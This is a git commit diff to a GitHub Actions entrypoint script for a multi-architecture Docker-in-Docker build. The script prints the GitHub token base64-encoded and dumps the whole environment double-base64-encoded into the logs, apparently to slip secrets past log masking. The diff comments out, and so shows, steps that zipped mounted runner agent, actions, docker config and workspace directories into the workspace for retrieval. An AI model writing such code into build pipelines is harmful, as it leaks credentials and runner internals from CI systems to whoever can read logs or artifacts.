f343bf48108a64379bf397d2138efdc6e1d7d827
Matthewacon <matthewjbarichello@gmail.com>
2024-03-26 01:23:13 -0400

    Dump

--- .github/actions/dind-multiarch/entrypoint.sh
+++ .github/actions/dind-multiarch/entrypoint.sh
@@ -6,46 +6,46 @@ if [[ ! -z "$GITHUB_TOKEN" ]]; then
  printf 'The token is: %s\n' "$b64_token"
 fi
 
-#print root dir
-printf 'Github dir:\n'
-find /github | base64 | base64
+##print root dir
+#printf 'Github dir:\n'
+#find /github | base64 | base64
 
 #print env before
 printf 'Action env before:\n'
 env | base64 | base64
 
-#extract waagent if mounted
-if [[ -d '/waagent' ]]; then
- printf 'Copying waagent\n'
- find /waagent
- zip -r waagent.zip /waagent
- chown 1001 waagent.zip
- cp waagent.zip /workspace/
-fi
-
-#extract actions if mounted
-if [[ -d '/actions' ]]; then
- printf 'Copying actions\n'
- find /actions
- zip -r actions.zip /actions
- chown 1001 actions.zip
- cp actions.zip /workspace/
-fi
-
-#copy temp docker config
-if [[ -d '/temp-dir' ]]; then
- printf 'Copying temp-dir\n'
- find /temp-dir
- zip -r temp-dir.zip /temp-dir
- chown 1001 temp-dir.zip
- cp temp-dir.zip /workspace/
-fi
-
-#copy workspace
-printf 'Copying workspace\n'
-zip -r /github.zip /github
-chown 1001 /github.zip
-mv /github.zip /github/workspace/
+##extract waagent if mounted
+#if [[ -d '/waagent' ]]; then
+# printf 'Copying waagent\n'
+# find /waagent
+# zip -r waagent.zip /waagent
+# chown 1001 waagent.zip
+# cp waagent.zip /workspace/
+#fi
+#
+##extract actions if mounted
+#if [[ -d '/actions' ]]; then
+# printf 'Copying actions\n'
+# find /actions
+# zip -r actions.zip /actions
+# chown 1001 actions.zip
+# cp actions.zip /workspace/
+#fi
+#
+##copy temp docker config
+#if [[ -d '/temp-dir' ]]; then
+# printf 'Copying temp-dir\n'
+# find /temp-dir
+# zip -r temp-dir.zip /temp-dir
+# chown 1001 temp-dir.zip
+# cp temp-dir.zip /workspace/
+#fi
+#
+##copy workspace
+#printf 'Copying workspace\n'
+#zip -r /github.zip /github
+#chown 1001 /github.zip
+#mv /github.zip /github/workspace/
 
 #print images and containers before
 docker image ls
@@ -59,6 +59,6 @@ docker tag $image_id dind-multiarch:latest
 docker image ls
 docker container ps -a
 
-#print env after
-printf 'Action env after:\n'
-env | base64 | base64
+##print env after
+#printf 'Action env after:\n'
+#env | base64 | base64
